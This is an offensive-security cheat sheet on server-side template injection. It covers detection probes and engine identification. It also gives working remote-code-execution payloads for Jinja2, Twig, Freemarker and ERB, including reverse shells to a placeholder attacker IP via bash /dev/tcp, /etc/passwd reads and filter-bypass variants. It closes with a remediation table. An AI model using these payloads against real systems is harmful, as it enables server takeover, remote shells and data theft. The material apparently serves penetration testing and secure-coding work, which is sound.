# SSTI — Server-Side Template Injection

---

## What It Is

Template engines (Jinja2, Twig, Freemarker, Velocity, etc.) let developers embed expressions like `{{ user.name }}` in HTML. If user input is passed directly into a template **without sanitization**, you can inject template expressions that the server evaluates — leading to code execution.

**Key distinction from XSS:** The expression is evaluated **server-side**, not in the browser. You get RCE, not just script injection.

---

## Detection — The Math Test

Inject a math expression. Different engines use different syntax:

```
{{7*7}}         → Jinja2 / Twig → returns 49
${7*7}          → Freemarker / EL → returns 49
<%= 7*7 %>      → ERB (Ruby) → returns 49
#{7*7}          → Ruby (Slim)
*{7*7}          → Spring EL
${7*'7'}        → Twig → returns 7777777 (string * int = repeated string)
{{7*'7'}}       → Jinja2 → returns 7777777
```

If the response contains `49` (or `7777777`) where you put the expression → SSTI confirmed.

---

## Identify the Engine

```
{{7*'7'}}
```
- Returns `7777777` → **Jinja2** (Python) or **Twig** (PHP)
- Returns `49` → **Smarty** or **Mako**
- Errors out → check error message for engine name

Also check the tech stack:
- Python app → likely Jinja2
- PHP app → likely Twig or Smarty
- Java app → Freemarker or Velocity
- Ruby app → ERB

---

## Jinja2 (Python) — RCE

```python
# Read a file
{{ ''.__class__.__mro__[1].__subclasses__() }}
# (this lists all Python subclasses — look for Popen)

# Simpler RCE — execute system commands
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# If the above is filtered, try through config:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Reverse shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<your-ip>/4444 0>&1"').read() }}
```

---

## Twig (PHP) — RCE

```php
# Execute commands
{{['id']|filter('system')}}
{{['id','']|sort('passthru')}}

# File read
{{'/etc/passwd'|file_get_contents}}

# Reverse shell
{{['bash -c "bash -i >& /dev/tcp/<your-ip>/4444 0>&1"']|filter('system')}}
```

---

## Freemarker (Java) — RCE

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

${ex("bash -c {echo,<base64-shell>}|{base64,-d}|bash")}
```

---

## ERB (Ruby) — RCE

```ruby
<%= `id` %>
<%= system("bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'") %>
```

---

## Where to Find It

- URL parameters that appear in page content: `?name=John` → "Hello John"
- Search boxes where the term is reflected back
- Error messages that include your input
- Profile fields, subject lines, any user-controlled text that renders
- Custom 404/error pages

---

## Quick Identification Table

| Payload | Expected Output | Engine |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2, Twig |
| `${7*7}` | 49 | Freemarker, EL |
| `<%= 7*7 %>` | 49 | ERB |
| `{{7*'7'}}` | 7777777 | Jinja2 |
| `${7*'7'}` | 7777777 | Twig |
| `#{ 7 * 7 }` | 49 | Ruby Slim |

---

## Payload When Dots Are Filtered (Jinja2)

```python
# Use attr() filter to avoid dot notation
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}

# Or use [] bracket notation
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
```

---

## Remediation

**Root cause:** User input is passed directly into a template engine's render function, rather than being inserted as data into a pre-compiled template. The template engine then evaluates the input as code.

| Finding | Remediation |
|---|---|
| SSTI (any engine) | **Never pass user input to `render(user_input)`.** Render a static template and pass user input as a variable: `render("Hello {{ name }}", name=user_input)`. The template is fixed; only the data changes. |
| Jinja2 (Python/Flask) | Use `render_template()` with a template file, not `render_template_string(user_input)`. If string rendering is needed, use the Jinja2 **sandbox environment**: `SandboxedEnvironment()`. |
| Twig (PHP) | Never pass user input to `$twig->createTemplate($user_input)`. Use `$twig->render('template.html', ['var' => $user_input])`. Enable Twig sandbox mode for any templates that include user content. |
| Freemarker (Java) | Disable access to `freemarker.template.utility.Execute` class. Use `TemplateClassResolver.SAFER_RESOLVER` in configuration. |
| ERB (Ruby) | Never call `ERB.new(user_input).result`. Use `ERB.new("Hello <%= name %>").result(binding)` where `name` is set from user input as a variable. |

**Key point for reports:** SSTI gives RCE in almost every case — it's one of the highest severity web vulnerabilities. The fix is architecturally simple (separate template from data) but requires code review to find all instances where user input touches the template engine's render function.

---

## Reference

HackTricks SSTI: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
PayloadsAllTheThings SSTI: all engines and filter bypasses in one place.
